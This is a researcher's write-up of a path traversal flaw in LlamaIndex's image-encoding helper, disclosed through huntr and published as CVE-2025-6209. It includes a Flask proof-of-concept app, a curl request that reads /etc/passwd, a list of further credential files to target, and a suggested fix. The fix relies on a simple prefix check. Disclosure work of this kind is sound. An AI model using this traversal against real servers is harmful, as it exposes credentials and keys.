"It's just an image" is one of the most expensive phrases in application security. It lowers everyone's guard - the reviewer's, the framework author's - because an image feels inert. But an image arrives as a *path*, and a path is a path. The file on the other end of it does not care that the variable holding it is called `image_path`.

LlamaIndex had a little multimodal helper that took an image path, opened it, and handed the bytes back base64-encoded. It never checked that the path pointed anywhere it should. So you could feed it `/etc/passwd` and get `/etc/passwd` back.

## Where images turn into paths

Multimodal ingestion is a good place to hunt precisely because of that lowered guard. Images come in as paths, paths get opened, and nobody treats "the image loader" as an attack surface. I followed the path from `ImageDocument` down into `encode_image`, in `generic_utils.py`, and found this:

```
with open(image_path, "rb") as image_file:
    return base64.b64encode(image_file.read()).decode("utf-8")
```

That's the whole thing. Open the path you were given, read it, encode it, return it. No canonicalization, no check that the path stays inside some media directory, nothing.

## The function did exactly what it was told

There's no clever bypass here, and that's the point. The function's contract was "give me an image, I'll encode it," and it honoured that contract with total sincerity. `image_path` is attacker-controllable through `ImageDocument`, so `../../../../etc/passwd` and plain absolute paths both just... work. There was never a boundary drawn, so there is nothing for a traversal sequence to have to escape. You aren't breaking out of the images folder; there was no images folder.

Two details make it worse than a typical blind file-touch. First, the result is *returned to the caller* - so the read isn't blind, the file's contents come back in full through a normal document flow. Second, because nothing was ever validated, it works exactly the same whether you use `../../` tricks or just name the absolute path.

## Reading /etc/passwd through a photo uploader

Here's a Flask app that does what a real multimodal pipeline does - takes an image path and hands it to `ImageDocument`:

```
from flask import Flask, request
import base64
from llama_index.core.schema import ImageDocument
from llama_index.core.multi_modal_llms.generic_utils import image_documents_to_base64

app = Flask(__name__)

@app.route("/upload", methods=["POST"])
def upload_image():
    image_path = request.form.get("image_path")   # attacker-controlled
    doc = ImageDocument(image_path=image_path)
    encoded = image_documents_to_base64([doc])
    return {"decoded": base64.b64decode(encoded[0]).decode("utf-8")[:500]}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Now ask it for a file that is very much not an image:

```
curl -X POST -F "image_path=../../../../etc/passwd" http://localhost:5000/upload
```

The server dutifully base64-encodes `/etc/passwd` and hands the contents back. Swap in `/etc/shadow`, `~/.ssh/id_rsa`, or an app's `.env` and it's the same request.

## What it gets you

Any file the process can read, delivered through a routine ingestion path - and delivered *in full*, since the encoded bytes come back to you. That's direct information disclosure of credentials and configs, and a clean first step toward privilege escalation once you're reading keys off the box. Tested on 0.12.27.

## The fix, and the habit behind it

Canonicalize the path, then confirm it lives inside a directory you actually allow, before you open it:

```
import os

def sanitize_path(image_path):
    absolute_path = os.path.abspath(image_path)
    if not absolute_path.startswith("/path/to/images"):
        raise ValueError("Invalid file path")
    return absolute_path
```

The habit worth taking from this: any time user input becomes a filesystem path, the variable name is a lie you're telling yourself. `image_path`, `avatar`, `template`, `report` - they're all just "a path an attacker picked" until you've pinned them to a directory you control.

## Disclosure

Reported through huntr on April 1, 2025. Fixed upstream, published as CVE-2025-6209 (CWE-22), CVSS 7.5 - assigned to my report.
